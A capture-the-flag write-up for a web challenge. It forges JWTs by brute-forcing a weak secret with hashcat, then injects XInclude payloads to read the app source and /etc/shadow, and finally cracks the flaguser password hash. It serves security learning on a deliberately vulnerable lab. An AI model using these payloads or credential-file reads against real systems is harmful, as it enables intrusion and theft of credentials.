## Title 

Username

## Description

Please register your username. Have fun!

## Solution

Hint:

```txt
The JWT is meant to be cracked.

But the secret is not in any word list. 
```

In the html code we have a comment, this will be interesting if we can read files:

```
 TODO: Decide if /app/app.py is ok to use 
```

The webpage has a form that allow us to add a username. It then generates a JWT token when decoded it gives us the following XML as a payload (test was the username we tried):

```json
{
  "data": "<data><username>test</username></data>"
}
```

There are three ways to manipulate/"crack" the secret in the JWT token:
  - By removing the algorithm: `"alg": "none"`
  - Dictionary attack: Looking up the secret in an online word list
  - Bruteforce attack: try all 1 character strings, then try all 2 character strings, etc...

We tried each way but only the brute force worked! We used hashcat to crack the secret:
`hashcat --potfile-disable -a 3 -m 16500 hash -O`

- `--potfile-disable`:  hashcat keeps a record of cracked hashes so if you run it a second time "nothing" seems to happen. This option makes it so you can run many times in a row as if it were the "first time"
- `-a 3`: attack mode -> brute force
- `-m 16500`: tells hashcat that its a jwt token to crack
- `-O`: optimize

After some time we get: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnRlc3Q8L3VzZXJuYW1lPjwvZGF0YT4ifQ.vJ75OkPcq1lal2JCPQ7RYQGws0dSU7Q70J1U4_QvkAg:mstzt`

Where `mstzt` is the secret to sign the JWT token.

In this stage we need to read the /app/app.js and we have two options:
- XXE (XML External Entity) attack
- SSTI (Server Side Template Injection)


Lets try a simple XXE to read the file:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///app/app.py">
]>
<data><username>&file;</username></data>
``` 

If we try the payload we get the error: `Error: No entity references please`

```
{
  "data": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///app/app.py\">]><data><username>&file;</username></data>"
}
```

If entities are not allowed we can try `parameter entities`, however they are not allowed either: `Error: No parameter file entities please`.

```
{
  "data": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///app/app.py\">]><data><username>%file;</username></data>"
}
```

Lets try Xinclude:

```

{
  "data": "<data><username><xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" parse=\"text\" href=\"file:///app/app.py\"/></username></data>"
}

```

The response is as follows, decoded in HTML:

```python
Welcome import flask
from flask import Flask, render_template, request, url_for
import jwt
from lxml import etree
import os
import re
import tempfile

app = Flask(__name__)

FLAG = os.environ.get('FLAG') or 'wcft{fake-flag}'
FLAGUSER_PASSWORD = os.environ.get('FLAGUSER_PASSWORD') or 'fake-password'

JWT_SECRET = os.environ.get('JWT_SECRET') or 'secret'

JWT_ALG = 'HS256'
JWT_COOKIE = 'appdata'


@app.route('/')
def root():
    return render_template("index.html")


@app.route('/secret-welcome-935734', methods=['GET'])
def secret_welcome():
    # There is a linux user named 'flaguser'
    # Login here with that username and their linux password.
    auth = request.authorization

    if auth is None or auth.username != 'flaguser' or auth.password != FLAGUSER_PASSWORD:
        resp = flask.Response('Please provide the right credentials to get the flag')
        resp.headers['WWW-Authenticate'] = 'Basic'
        return resp, 401

    return f'Congrats, here is your flag: {FLAG}'


@app.route('/welcome', methods=['GET'])
def welcome():
    cookie = request.cookies.get(JWT_COOKIE)

    if not cookie:
        return f'Error: missing {JWT_COOKIE} cookie value'

    try:
        jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG])
    except:
        return 'Error: unable to decode JWT cookie', 400

    data = jwtData['data']
    if not data:
        return 'Error: missing data field from decoded JWT', 400

    xmlText = str(data)
    if '&' in xmlText:
        return 'Error: No entity references please', 400
    if '%' in xmlText:
        return 'Error: No parameter file entities please', 400

    tmp = tempfile.NamedTemporaryFile()

    # Open the file for writing.
    with open(tmp.name, 'w') as f:
        f.write(xmlText)

    try:
        parser = etree.XMLParser(resolve_entities=False)
        xmlDoc = etree.parse(tmp.name, parser=parser)
        xmlDoc.xinclude()
    except Exception as e:
        print('XML Error:', e)
        return 'Error: Error parsing XML', 400


    usernameElement = xmlDoc.find('username')
    if usernameElement is None:
        return 'Error: Missing username element in XML', 400

    username = usernameElement.text

    return render_template("welcome.html", username=username)


@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username')

    if not username:
        return 'Error: username is required', 400

    username = str(username)

    if not re.match('^[a-z]+$', username):
        return 'Error: username must be only lowercase letters', 400

    if len(username) < 3:
        return 'Error: username must be at least 3 letters', 400

    if len(username) > 20:
        return 'Error: username must be no longer than 20 letters', 400

    # Useful for chal development
    # username = '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="/app/app.py" parse="text"/>'
    xml = f'<data><username>{username}</username></data>'

    jwtData = {"data": xml}

    cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG)

    response = flask.make_response(f'hello {username}')
    response.set_cookie(JWT_COOKIE, cookie)

    response.headers['location'] = url_for('welcome')
    return response, 302

if __name__ == "__main__":
    app.run(debug=False)
```

We have an endpoint `/secret-welcome-935734` which receives some credentials and gets us the flag which is stores in the environment variable `FLAG`.
We know that the user is `flaguser` and we know from the comments that we have a linux user with the same username.
Lets try to read `/etc/shadow` or `/etc/passwd` to get the user password hash.

Note: There is a file with the environment variables called `/proc/self/environ` however the xinclude exploit don't seems to work.
```

{
  "data": "<data><username><xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" parse=\"text\" href=\"file:///etc/shadow\"/></username></data>"
}

```

We get the following entries:

``` shell
root:*:19764:0:99999:7:::
daemon:*:19764:0:99999:7:::
bin:*:19764:0:99999:7:::
sys:*:19764:0:99999:7:::
sync:*:19764:0:99999:7:::
games:*:19764:0:99999:7:::
man:*:19764:0:99999:7:::
lp:*:19764:0:99999:7:::
mail:*:19764:0:99999:7:::
news:*:19764:0:99999:7:::
uucp:*:19764:0:99999:7:::
proxy:*:19764:0:99999:7:::
www-data:*:19764:0:99999:7:::
backup:*:19764:0:99999:7:::
list:*:19764:0:99999:7:::
irc:*:19764:0:99999:7:::
_apt:*:19764:0:99999:7:::
nobody:*:19764:0:99999:7:::
flaguser:$1$hack$BzqsFHqkPjQ2Sn9amFsgN0:19767:0:99999:7:::
``` 

We got the flaguser password hash: `$1$hack$BzqsFHqkPjQ2Sn9amFsgN0`, lets try to crack it using hashcat.
`hashcat --potfile-disable -a 3 -m 500 hash_flaguser`

After a couple of seconds we get: `$1$hack$BzqsFHqkPjQ2Sn9amFsgN0:qqz3`

Flag:`wctf{cr4ck1n_4nd_1nclud1n_4_th3_w1n_1352234}`